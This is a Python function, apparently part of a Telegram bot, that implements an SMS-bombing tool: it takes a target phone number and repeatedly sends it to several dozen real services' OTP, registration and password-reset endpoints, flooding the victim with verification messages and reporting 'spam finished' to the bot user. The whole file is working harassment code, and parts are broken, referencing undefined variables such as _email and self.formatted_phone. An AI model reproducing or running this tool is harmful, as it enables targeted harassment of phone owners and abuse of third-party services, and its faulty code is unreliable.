def spamm(_phone, code_country, id, bot):
    import requests
    import random
    import time
    import telebot
    from config import number_of_cycles


    if code_country[0] == '+':
        code_country = code_country[1:]

    _phone = code_country + _phone[-10:]
    _name = ''

    result = False
    for lett in _phone:
        if lett not in '1234567890':
            result = True

    if result:
        print('Ошибка')
        return 1

    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    _phone9 = _phone[1:]
    _phoneAresBank = '+' + code_country + '(' + _phone[-10:-7] + ')' + _phone[-7:-4] + '-' + _phone[-4:-2] + '-' + _phone[-2:]
    _phone9dostavista = code_country + _phone[:-7] + '+' + _phone9[-7:-5] + '-' + _phone9[-5:-3] + '-' + _phone9[-3:]
    _phoneOstin = '+' + code_country + '+(' + _phone[-10:-7] + ')' + _phone[-7:-4] + '-' + _phone[-4:-2] + '-' + _phone[-2:]
    _phonePizzahut = '+' + code_country + ' (' + _phone[-10:-7] + ') ' + _phone[-7:-4] + ' ' + _phone[-4:-2] + ' ' + _phone[-2:]
    _phoneGorzdrav = _phone[-10:-7] + ') ' + _phone[-7:-4] + '-' + _phone[-4:-2] + '-' + _phone[-2:]

    iteration = 0
    while True:
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        except:
            pass

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        except:
            pass

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
        except:
            pass

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        except:
            pass

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
        except:
            pass

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        except:
            pass

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except:
            pass

        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
        except:
            pass

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        except:
            pass

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
        except:
            pass

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
        except:
            pass

        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        except:
            pass

        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
        except:
            pass

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        except:
            pass

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        except:
            pass

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
        except:
            pass

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        except:
            pass

        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
        except:
            pass

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                          json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                                'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                'bKIRequestAgreement': 'null',
                                'promotionAgreement': 'true'})
        except:
            pass

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        except:
            pass

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        except:
            pass

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        except:
            pass

        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except:
            pass

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        except:
            pass

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        except:
            pass

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        except:
            pass

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",
                          json={"phone": {"code": 1, "number": _phone}})
        except:
            pass

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except:
            pass

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        except:
            pass

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
        except:
            pass

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        except:
            pass

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
        except:
            pass

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
        except:
            pass

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
        except:
            pass

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        except:
            pass

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
        except:
            pass

        try:
            requests.post('https://plink.tech/register/', json={"phone": _phone})
        except:
            pass

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
        except:
            pass

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
        except:
            pass

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
        except:
            pass

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
        except:
            pass

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
        except:
            pass

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
        except:
            pass

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
        except:
            pass

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except:
            pass

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
        except:
            pass

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
        except:
            pass

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        except:
            pass

        try:
            iteration += 1
            if iteration >= number_of_cycles:
                bot.send_message(id, 'Спам на номер {} завершен'.format(_phone))
                break
        except:
            print('error')
            break
